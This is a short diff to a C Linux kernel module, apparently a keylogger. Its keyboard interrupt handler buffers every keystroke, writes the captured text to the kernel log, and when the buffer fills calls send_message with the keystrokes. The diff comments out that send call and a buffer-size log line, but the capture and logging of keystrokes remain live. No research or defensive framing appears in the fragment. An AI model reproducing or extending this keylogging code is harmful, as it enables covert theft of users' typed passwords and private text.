@@ -25,10 +25,10 @@ irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
         buffer_count = (buffer_count + 1)%KEY_BUFFER_SIZE;
 
         printk(KERN_INFO "Buffer: %s\n", keystrokes);
-        printk(KERN_INFO "Buffer size: %d\n", buffer_count);
+        //printk(KERN_INFO "Buffer size: %d\n", buffer_count);
 
         if (buffer_count == 0) {
-            send_message(keystrokes);
+            //send_message(keystrokes);
         }
     }
 
